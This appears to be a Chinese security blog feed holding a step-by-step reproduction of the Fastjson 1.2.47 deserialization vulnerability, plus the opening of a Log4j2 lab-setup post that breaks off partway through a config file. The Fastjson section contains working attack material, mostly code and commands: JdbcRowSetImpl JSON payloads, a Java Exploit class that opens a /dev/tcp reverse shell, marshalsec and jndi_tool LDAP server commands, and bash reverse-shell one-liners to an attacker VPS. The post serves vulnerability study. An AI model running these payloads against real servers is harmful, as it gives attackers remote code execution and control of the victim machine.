        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/1.png" data-caption="image-20220831181656337"><img src="/../images/fastjson-1.2.47/1.png" alt="image-20220831181656337"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>近期攻防值守期间，发现客户单位仍然存在 Fastjson 反序列化漏洞，时隔多秋该漏洞仍然可以被作为打点的利器，于是本着学习的心态重新学习一遍。</p><h2 id="Ox01-环境搭建"><a href="#Ox01-环境搭建" class="headerlink" title="Ox01 环境搭建"></a>Ox01 环境搭建</h2><blockquote><p>Tomcat环境搭建</p></blockquote><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre><span class="meta prompt_">$</span>下载 tomcat9archive.apache.org/dist/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.zip<p><span class="meta prompt_">$</span> 将此压缩包复制到linux服务器上，并重命名为tomcat9<br>tar -zxvf apache-tomcat-9.0.27.tar.gz<br>mv &#x2F;apache-tomcat-9.0.27 &#x2F;tomcat9</p><p><span class="meta prompt_">$</span> 授予tomcat9这个文件夹777权限<br>chmod -R 777 &#x2F;tomcat9<br></pre></p></td></tr></tbody></table></figure><blockquote><p>Java 环境搭建</p></blockquote><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre><span class="meta prompt_">$</span> 下载 java 8u181https://mirrors.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz<p><span class="meta prompt_">$</span> 解压后将 java 文件复制到 &#x2F;usr&#x2F;java 目录下<br>tar -zxvf jdk-8u181-linux-x64.tar.gz<br>mkdir &#x2F;usr&#x2F;java<br>mv jdk1.8.0_181&#x2F; &#x2F;usr&#x2F;java</p><p><span class="meta prompt_">$</span> 配置 java 环境<br>vim &#x2F;etc&#x2F;profile</p><p><span class="meta prompt_">$</span> 配置 java 环境，其中 CATALINA_HOME&#x3D;&#x2F; 本地 tomcat 目录,具体看自身 tomcat9 放置路径在哪<br>export JAVA_HOME&#x3D;&#x2F;usr&#x2F;java&#x2F;jdk1.8.0_181<br>export JRE_HOME&#x3D;&#x2F;usr&#x2F;java&#x2F;jdk1.8.0_181&#x2F;jre<br>export CLASS_PATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar:$JRE_HOME&#x2F;lib<br>export PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin:$JRE_HOME&#x2F;bin<br>export CATALINA_HOME&#x3D;&#x2F;tomcat9</p><p><span class="meta prompt_">$</span> 使配置文件生效<br>source &#x2F;etc&#x2F;profile</p><p><span class="meta prompt_">$</span> 查看 java 环境是否生效<br>[root@vultr ~]# java -version<br>java version “1.8.0_181”<br>Java(TM) SE Runtime Environment (build 1.8.0_181-b13)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)<br></pre></p></td></tr></tbody></table></figure><blockquote><p>Fastjson环境部署</p></blockquote><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre><span class="meta prompt_">$</span> fastjson-1.2.47，Web 环境文件下载https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&shfl=shareset 提取码: sven<p><span class="meta prompt_">$</span> 将fastjson.war放置以下目录<br>tomcat9&#x2F;bin</p><p><span class="meta prompt_">$</span> 授予tomcat9这个文件夹777权限<br>chmod -R 777 &#x2F;tomcat9<br></pre></p></td></tr></tbody></table></figure><blockquote><p>漏洞环境启动</p></blockquote><p>1、进入 tomcat&#x2F;bin 目录输入以下命令启动环境</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./catalina.sh start</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/3.png" data-caption="image-20220831144348744"><img src="/../images/fastjson-1.2.47/3.png" alt="image-20220831144348744"></a></p><p>2、tomcat服务正常</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/4.png" data-caption="image-20220829113214101"><img src="/../images/fastjson-1.2.47/4.png" alt="image-20220829113214101"></a></p><p>3、出现 Hello Word，fastjson 漏洞环境正常</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/5.png" data-caption="image-20220831144845976"><img src="/../images/fastjson-1.2.47/5.png" alt="image-20220831144845976"></a></p><hr><h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><blockquote><p>手动反弹</p></blockquote><p>1、根据前面的环境部署 JDK 为 8u181，所以使用 LDAP 方式进行漏洞复现，本次复现具体漏洞环境为</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>[+] apache-tomcat-9.0.27[+] fastsjon-1.2.47[+] jdk-8u181[+] 两台真实VPS，一台搭建漏洞环境，一台用于反弹shell[+] win10攻击机</pre></td></tr></tbody></table></figure><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/6.png" data-caption="img"><img src="/../images/fastjson-1.2.47/6.png" alt="img"></a></p><center>【图一】 RMI 与 LDAP 具体支持版本的 JDK 版本</center><br><p>2、LADP 反弹 shell，测试 fastjson 服务是否正常运行</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;xx&quot;,&quot;age&quot;:&quot;999&quot;&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/7.png" data-caption="image-20220831145323940"><img src="/../images/fastjson-1.2.47/7.png" alt="image-20220831145323940"></a></p><p>响应正常，fastsjon服务正常</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/8.png" data-caption="image-20220831204721804"><img src="/../images/fastjson-1.2.47/8.png" alt="image-20220831204721804"></a></p><p>2、利用 DNSlog 进行漏洞探测, POC 如下</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://dnslog域名&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/9.png" data-caption="image-20220831132648019"><img src="/../images/fastjson-1.2.47/9.png" alt="image-20220831132648019"></a></p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/10.png" data-caption="image-20220831132438496"><img src="/../images/fastjson-1.2.47/10.png" alt="image-20220831132438496"></a></p><p>3、反弹shell</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/11.png" data-caption="image-20220831205912490"><img src="/../images/fastjson-1.2.47/11.png" alt="image-20220831205912490"></a></p><p>将以下代码命名为 Exploit.java 编译生成 Exploit.class ,并开启 Python 临时 Web 服务放置恶意类;代码中反弹 shell 中需更改为获取反弹 shell 的 VPS 地址，2333为后续 nc 监听的端口。</p><div class="highlight-wrap" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/反弹shell主机IP/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/12.png" data-caption="image-20220831150537216"><img src="/../images/fastjson-1.2.47/12.png" alt="image-20220831150537216"></a></p><p>利用 marshalsec 开启 LDAP 服务，2121为 LDAP 服务端口，3333为上一步开启的 python 服务端口</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://恶意class_IP:3333/#Exploit 2121</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/13.png" data-caption="image-20220831150758309"><img src="/../images/fastjson-1.2.47/13.png" alt="image-20220831150758309"></a></p><p>开启 nc 监听，等待反弹 shell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/14.png" data-caption="image-20220831150855930"><img src="/../images/fastjson-1.2.47/14.png" alt="image-20220831150855930"></a></p><p>Burp 放包，实现反弹 shell，Poc 如下</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://反弹shell主机IP:2121/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/15.png" data-caption="image-20220831134702119"><img src="/../images/fastjson-1.2.47/15.png" alt="image-20220831134702119"></a></p><p>VPS 查看，成功反弹</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/16.png" data-caption="image-20220831210528598"><img src="/../images/fastjson-1.2.47/16.png" alt="image-20220831210528598"></a></p><hr><h2 id="0x03-其它方法"><a href="#0x03-其它方法" class="headerlink" title="0x03 其它方法"></a>0x03 其它方法</h2><blockquote><p>利用 jndi_tool 获取反弹 shell</p></blockquote><p>1、工具下载链接</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/wyzxxz/jndi_tool</span><br></pre></td></tr></table></figure></div><p>2、反弹 shell 命令</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 详细命令</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer x.x.x.x 2121 &quot;bash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/2333 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line"># 命令解释</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer 本机IP LDAP服务监听端口 &quot;bash=bash -i &gt;&amp;/dev/tcp/获取反弹shell的VPS_IP/获取shell监听端口 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/17.png" data-caption="image-20220831200418585"><img src="/../images/fastjson-1.2.47/17.png" alt="image-20220831200418585"></a></p><p>3、Burp 放包执行命令</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://x.x.x.x:2121/Object&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/18.png" data-caption="image-20220831200818338"><img src="/../images/fastjson-1.2.47/18.png" alt="image-20220831200818338"></a></p><p>4、成功获取反弹 shell</p><p><a data-fancybox="gallery" data-src="/../images/fastjson-1.2.47/19.png" data-caption="image-20220831201239796"><img src="/../images/fastjson-1.2.47/19.png" alt="image-20220831201239796"></a></p><p>5、工具作者教程：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ldap:</span><br><span class="line">1. 启动LDAP服务，后面写要执行的语句</span><br><span class="line">java -cp jndi_tool.jar jndi.HLDAPServer xx.xx.xx.xx 80 &quot;curl dnslog.wyzxxz.cn&quot;</span><br><span class="line"></span><br><span class="line">2. 发送请求包</span><br><span class="line">POST /test HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) </span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://xx.xx.xx.xx:80/Object&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. 查看日志是否执行成功</span><br><span class="line"></span><br><span class="line">4、注：使用常规反弹shell无法实现反弹，作者反馈反弹shell命令为：bash=bash -i &gt;&amp;/dev/tcp/x.x.x.x/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div><blockquote><p>Burp 被动扫描插件</p></blockquote><p>1、下载地址</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/pmiaowu/BurpFastJsonScan/releases/tag/BurpFastJsonScan-2.2.2</span><br></pre></td></tr></table></figure></div><p>2、导入 Burp 后，遇到 json 语句会自动扫描，开启后关闭结果即可</p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/hei-zi/p/13274272.html</span><br><span class="line">https://www.cnblogs.com/nul1/p/12747709.html</span><br><span class="line">http://arsenetang.com/2022/03/20/Java%E7%AF%87%E4%B9%8BRMI&amp;LDAP/</span><br><span class="line">https://github.com/safe6Sec/Fastjson</span><br></pre></td></tr></table></figure></div><h2 id="0x05-本文工具"><a href="#0x05-本文工具" class="headerlink" title="0x05 本文工具"></a>0x05 本文工具</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.zip</span><br><span class="line">https://mirrors.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz</span><br><span class="line">https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&amp;shfl=shareset 提取码: sven</span><br><span class="line">marshalsec-0.0.3-SNAPSHOT-all.jar</span><br><span class="line">https://github.com/wyzxxz/jndi_tool</span><br><span class="line">https://github.com/pmiaowu/BurpFastJsonScan/releases/tag/BurpFastJsonScan-2.2.2</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2漏洞环境搭建及复现</title>
      <link href="/2022/09/02/Log4j2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/09/02/Log4j2%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/log4j2/1.png" data-caption="image-20220901140741054"><img src="/../images/log4j2/1.png" alt="image-20220901140741054"></a></p><h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>1、漏洞影响版本</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log4j2.x&lt;=2.14.1</span><br></pre></td></tr></table></figure></div><h2 id="0x02-所需环境"><a href="#0x02-所需环境" class="headerlink" title="0x02 所需环境"></a>0x02 所需环境</h2><p>1、tomcat版本8.0.51</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://archive.apache.org/dist/tomcat/tomcat-8/</span><br></pre></td></tr></table></figure></div><p>2、tomcat日志扩展接口包</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat-juli.jar</span><br><span class="line">tomcat-juli-adapters.jar</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 下载地址</span><br><span class="line">http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.51/bin/extras/</span><br></pre></td></tr></table></figure></div><p>3、log4j2版本2.3</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log4j-core-2.3.jar</span><br><span class="line">log4j-api-2.3.jar</span><br><span class="line">log4j-1.2-api-2.3.jar</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 下载地址</span><br><span class="line">https://archive.apache.org/dist/logging/log4j/2.3/</span><br></pre></td></tr></table></figure></div><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><blockquote><p>tomcat环境搭建</p></blockquote><p>见站内Fastjson-1.2.47漏洞环境搭建及漏洞复现文字，搭建步骤相同</p><blockquote><p>log4j2环境引用</p></blockquote><p>1、新建Log4j2配置文件，更换tomcat默认输出组件为debug，确保参数无差别触发</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;Configuration status=<span class="string">&quot;debug&quot;</span>&gt;</span><br><span class="line">    &lt;Properties&gt;</span><br><span class="line">        &lt;Property name=<span class="string">&quot;logdir&quot;</span>&gt;$&#123;sys:catalina.base&#125;/logs&lt;/Property&gt;</span><br><span class="line">        &lt;Property name=<span class="string">&quot;layout&quot;</span>&gt;%d [%t] %-5p %c-%m%n&lt;/Property&gt;</span><br><span class="line">    &lt;/Properties&gt;</span><br><span class="line">    &lt;Appenders&gt;</span><br><span class="line">        &lt;Console name=<span class="string">&quot;CONSOLE&quot;</span> target=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span><br><span class="line">            &lt;PatternLayout charset=<span class="string">&quot;UTF-8&quot;</span> pattern=<span class="string">&quot;$&#123;layout&#125;&quot;</span> /&gt;</span><br><span class="line">        &lt;/Console&gt;</span><br><span class="line">        &lt;RollingFile name=<span class="string">&quot;CATALINA&quot;</span> fileName=<span class="string">&quot;$&#123;logdir&#125;/catalina.log&quot;</span></span><br><span class="line">            filePattern=<span class="string">&quot;$&#123;logdir&#125;/catalina.%d&#123;yyyy-MM-dd&#125;.log.gz&quot;</span>&gt;</span><br><span class="line">            &lt;PatternLayout charset=<span class="string">&quot;UTF-8&quot;</span> pattern=<span class="string">&quot;$&#123;layout&#125;&quot;</span> /&gt;</span><br><span class="line">            &lt;!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下<span class="number">7</span>个文件，这里设置了<span class="number">20</span> --&gt;</span><br><span class="line">            &lt;SizeBasedTriggeringPolicy size=<span class="string">&quot;50MB&quot;</span> /&gt;</span><br><span class="line">            &lt;DefaultRolloverStrategy max=<span class="string">&quot;20&quot;</span> /&gt;</span><br><span class="line">        &lt;/RollingFile&gt;</span><br><span class="line">        &lt;RollingFile name=<span class="string">&quot;LOCALHOST&quot;</span> fileName=<span class="string">&quot;$&#123;logdir&#125;/localhost.log&quot;</span></span><br><span class="line">            filePattern=<span class="string">&quot;$&#123;logdir&#125;/localhost.%d&#123;yyyy-MM-dd&#125;-%i.log.gz&quot;</span>&gt;</span><br><span class="line">            &lt;PatternLayout charset=<span class="string">&quot;UTF-8&quot;</span> pattern=<span class="string">&quot;$&#123;layout&#125;&quot;</span> /&gt;</span><br><span class="line">            &lt;SizeBasedTriggeringPolicy size=<span class="string">&quot;50MB&quot;</span> /&gt;</span><br><span class="line">            &lt;DefaultRolloverStrategy max=<span class="string">&quot;20&quot;</span> /&gt;</span><br><span class="line">        &lt;/RollingFile&gt;</span><br><span class="line">    &lt;/Appenders&gt;</span><br><span class="line">    &lt;Loggers&gt;</span><br><span class="line">        &lt;Logger</span><br><span class="line">            name=<span class="string">&quot;org.apache.catalina.core.ContainerBase.[Catalina].[localhost]&quot;</span></span><br><span class="line">            level=<span class="string">&quot;info&quot;</span>&gt;</span><br><span class="line">            &lt;AppenderRef ref=<span class="string">&quot;LOCALHOST&quot;</span> /&gt;</span><br><span class="line">        &lt;/Logger&gt;</span><br><span class="line">        &lt;Root level=<span class="string">&quot;debug&quot;</span>&gt;</span><br><span class="line">            &lt;AppenderRef ref=<span class="string">&quot;CATALINA&quot;</span> /&gt;</span><br><span class="line">            &lt;AppenderRef ref=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span><br><span class="line">        &lt;/Root&gt;</span><br><span class="line">    